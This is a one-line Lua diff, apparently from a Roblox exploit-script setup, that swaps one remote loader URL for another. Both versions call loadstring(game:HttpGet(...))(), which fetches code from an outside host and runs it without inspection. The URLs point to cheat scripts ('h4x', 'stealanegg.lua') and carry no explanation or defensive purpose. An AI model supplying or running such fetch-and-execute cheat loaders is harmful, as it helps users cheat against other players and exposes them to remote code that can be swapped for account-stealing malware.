@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://robloxscriptbest.com/script/loader.php?script=h4x"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lennonxscripts/lennonhubv3/refs/heads/main/stealanegg.lua"))()
